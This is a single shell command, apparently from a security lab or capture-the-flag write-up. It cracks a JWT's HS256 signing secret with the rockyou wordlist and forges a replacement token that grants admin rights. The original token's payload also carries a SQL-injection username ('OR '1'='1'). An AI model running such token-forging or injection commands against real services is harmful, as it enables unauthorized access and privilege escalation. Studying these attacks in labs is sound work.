``` shell
python3 crack.py \
  --token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyJyBPUiAnMSc9JzEiLCJhZG1pbiI6ZmFsc2V9.vE079_SHAaC-Q1Ewi1_dWn0Txy4JjP6kIUSZLo4ql8Y \
  --wordlist rockyou.txt \
  --new-payload '{"user":"testuser","admin":true}'
```